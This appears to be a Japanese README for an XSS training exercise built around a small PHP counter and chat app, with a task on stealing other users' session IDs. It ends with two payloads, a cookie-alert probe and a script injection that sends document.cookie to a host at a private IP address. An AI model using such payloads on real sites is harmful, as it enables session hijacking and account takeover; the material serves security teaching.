# PHP Session ID

XSSの課題サンプルです。

## Chrome Edit This Cookieプラグイン

https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=ja


## index.php

ボタンを押すと数字が増えます。楽しい！

## chat.php

おしゃべりできます。なんてエキサイティング！

## セキュリティ課題：他のユーザのSESSION IDを取得するには

### 不正なコード

```
<script>alert(document.cookie)</script>
```

```
<script>const s = document.createElement("script"); s.src="http://192.168.0.26:18080/?cookie=" + document.cookie;document.querySelector("head").append(s);</script>
```
